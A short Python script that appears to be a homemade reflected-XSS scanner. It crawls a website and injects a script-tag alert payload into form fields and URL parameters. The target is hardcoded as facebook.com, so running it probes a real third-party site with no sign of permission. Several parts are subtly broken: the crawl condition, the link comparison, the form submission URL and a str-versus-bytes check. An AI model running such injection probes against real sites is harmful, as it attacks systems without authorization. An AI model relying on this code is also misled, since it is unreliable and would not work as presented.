from requests import get, exceptions, session
from re import findall
from urllib.parse import urljoin
from bs4 import BeautifulSoup as bs
from sys import exit as ext


class Scanner:
    def __init__(self, url):
        self.url = url
        self.session = session()
        self.readed_links = [url]
        self.link_count = 0

    def request(self, url):
        try:
            return self.session.get(url)
        except exceptions.ConnectionError:
            pass

    def get_links(self, content):
        links = set(findall('(?:href=")(.*?)"', content.decode()))
        for link in links:
            link = urljoin(self.url, link)
            if '#' in link:
                link = link.split('#')[0]
            if self.url in link and link != self.readed_links:
                self.readed_links.append(link)

    def crawl(self, url):
        response = self.request(url)
        links = self.get_links(response.content)
        if len(self.readed_links) <= self.link_count:
            self.link_count += 1
            self.crawl(url=self.readed_links[self.link_count])

    def start(self):
        for link in self.readed_links:
            forms = self.get_forms(link)
            for form in forms:
                if self.xss_form(form, link):
                    print(
                        f"[!] Form vulnerable: {form.get('name')} in {link} to xss")
                    print("------------------------------------------------------")
                    print(form)

            if "=" in link:
                if self.xss_link(link):
                    print(f"[!] Link vunerable: {link} to xss")

    def get_forms(self, url):
        response = self.request(url)
        html = bs(response.content, "html.parser")
        return html.findAll("form")

    def submit(self, form, value, url):
        action = form.get('action')
        method = form.get('method')
        post_url = urljoin(url, action)
        inputs = form.findAll("input")
        post_data = {}

        for inp in inputs:
            inp_name = inp.get('name')
            inp_type = inp.get('type')
            inp_value = inp.get('value')
            if inp_type == 'text':
                inp_value = value

            post_data[inp_name] = inp_value

        if method == 'get':
            return self.session.get(url, params=post_data)
        elif method == 'post':
            return self.session.post(url, data=post_data)

    def xss_link(self, url):
        script = "<script>alert('alert')</script>"
        url = url.replace("=", "=" + script)
        response = self.session.get(url)
        return script in response.content

    def xss_form(self, form, url):
        script = "<script>alert('alert')</script>"
        response = self.submit(form, script, url)
        return script in response.content


scann = Scanner("https://www.facebook.com")

scann.crawl(scann.url)
try:
    scann.start()
except KeyboardInterrupt:
    ext()
